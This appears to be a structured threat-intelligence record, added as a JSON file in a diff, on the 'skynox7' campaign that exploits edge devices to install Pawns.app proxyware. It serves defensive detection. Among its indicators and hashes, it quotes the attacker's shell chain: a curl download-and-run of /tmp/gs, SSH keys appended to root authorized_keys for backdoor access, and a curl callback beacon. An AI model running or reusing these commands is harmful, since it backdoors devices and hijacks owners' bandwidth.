@@ -1,0 +1,268 @@
+{
+  "malware_family": "Pawns.app (proxyware)",
+  "threat_actor": "skynox7",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "An actor tracked as skynox7 compromises internet-facing edge devices (D-Link ShareCenter NAS, Ubiquiti UniFi Video NVR, SAP NetWeaver Visual Composer, plus DVR/NVR brands like Hikvision and Dahua) via known CVEs and installs the Pawns.app proxyware CLI to proxyjacking their bandwidth. At least 143 devices in 34 countries were compromised; in some cases the actor also drops an SSH public key into root and ubnt authorized_keys files as backup access. The download-and-execute chain uses /bin/sh, curl, /tmp/gs and a DONE callback beacon to an attacker-controlled IP.",
+  "mitre_techniques": [
+    "T1190",
+    "T1210",
+    "T1059.004",
+    "T1105",
+    "T1098.004",
+    "T1496",
+    "T1090"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "echo 'ssh-rsa AAAAB3NzaC1y<REDACTED> root@<REDACTED>' >> /root/.ssh/authorized_keys 2>/dev/null;",
+      "context": "SSH key persistence from shell command written to authorized_keys",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "echo 'ssh-rsa AAAAB3NzaC1y<REDACTED> root@<REDACTED>' >> /home/ubnt/.ssh/authorized_keys 2>/dev/null;",
+      "context": "Same attacker key appended to Ubiquiti ubnt user's authorized_keys",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "HOME=/tmp /tmp/gs -email=<REDACTED> -password=<REDACTED> -device-name=<REDACTED> -accept-tos >>/tmp/gs.log 2>&1;",
+      "context": "Pawns.app command-line variant launched with actor-supplied credentials",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sleep 5; curl -sk 'http://<REDACTED>/cb?out=DONE_<REDACTED>' 2>/dev/null",
+      "context": "Beacon back to attacker server confirming installation completed",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -sk --max-time 60 http://<REDACTED>/x86_64 -o /tmp/gs 2>/dev/null;",
+      "context": "Downloads Pawns.app x86_64 binary to /tmp/gs",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "chmod 777 /tmp/gs 2>/dev/null;",
+      "context": "Makes downloaded Pawns.app binary executable",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "mkdir -p /root/.ssh /home/ubnt/.ssh 2>/dev/null; ",
+      "context": "Creates SSH directories before dropping attacker key",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "chmod 600 /root/.ssh/authorized_keys /home/ubnt/.ssh/authorized_keys 2>/dev/null; ",
+      "context": "Locks down permissions on attacker-planted authorized_keys",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "/bin/sh",
+      "context": "Shell interpreter used to run the install chain on victim device",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "-c",
+      "context": "Shell flag in the install chain argv",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/gs",
+      "context": "Pawns.app proxyware binary downloaded to victim device",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/gs.log",
+      "context": "Log file for the Pawns.app client run on victim",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/root/.ssh/authorized_keys",
+      "context": "Attacker SSH public key persisted for backup access",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/home/ubnt/.ssh/authorized_keys",
+      "context": "Attacker SSH public key persisted on Ubiquiti devices",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ssh-rsa AAAAB3NzaC1y<REDACTED> root@<REDACTED>",
+      "context": "Attacker-planted SSH public key (redacted in report)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "-accept-tos",
+      "context": "Pawns.app CLI flag accepting terms of service",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "-device-name",
+      "context": "Pawns.app CLI flag setting advertised device name",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "-email=<REDACTED> -password=<REDACTED>",
+      "context": "Pawns.app CLI flags taking operator-supplied account credentials",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "skynox7@proton.me",
+      "context": "Pawns payout account attributed to the actor",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "209.99.190.80",
+      "context": "Used for exploitation of edge devices",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/cb?out=DONE_<REDACTED>",
+      "context": "Install-completion callback path on attacker server",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/x86_64",
+      "context": "Path serving the Pawns.app x86_64 payload",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "e3dedf983c572d3e646a9b70fe9b41be497a3a2e5342c36dd3bd37cef7ebeffd",
+      "description": "PAWNS APP binary (proxyware; not necessarily malware unless installed without consent)"
+    },
+    {
+      "sha256": "fdc18f4287c1c6a285c664d3ce0f17d3479bc246bc6c163eb90b1a84adb453a7",
+      "description": "PAWNS APP binary (proxyware; not necessarily malware unless installed without consent)"
+    },
+    {
+      "sha256": "4fd7fa22776dbfde7ddaf02a4f904564593e2ed69f87cbb7bbd6c206a874ecf7",
+      "description": "PAWNS APP binary (proxyware; not necessarily malware unless installed without consent)"
+    },
+    {
+      "sha256": "26abd52f207739556282023e82873424795abc5e527771205a40749f90c01f6e",
+      "description": "PAWNS APP binary (proxyware; not necessarily malware unless installed without consent)"
+    },
+    {
+      "sha256": "df27938d26c1c9421ff307aafcb87131521e05f5d87ecaaab4a32ece3335fee4",
+      "description": "PAWNS APP binary (proxyware; not necessarily malware unless installed without consent)"
+    },
+    {
+      "sha256": "2c12a3193b1528cd0a88d4fcfa0c060404de4c2bbe1fecb3fc3fa347f04e0165",
+      "description": "PAWNS APP binary (proxyware; not necessarily malware unless installed without consent)"
+    },
+    {
+      "sha256": "71f2924a549a8f79a48ff332b071a12cd0b01e9ba643e9f8ed7b72b6d382325d",
+      "description": "PAWNS APP binary (proxyware; not necessarily malware unless installed without consent)"
+    }
+  ],
+  "file_types": [
+    "elf"
+  ]
+}
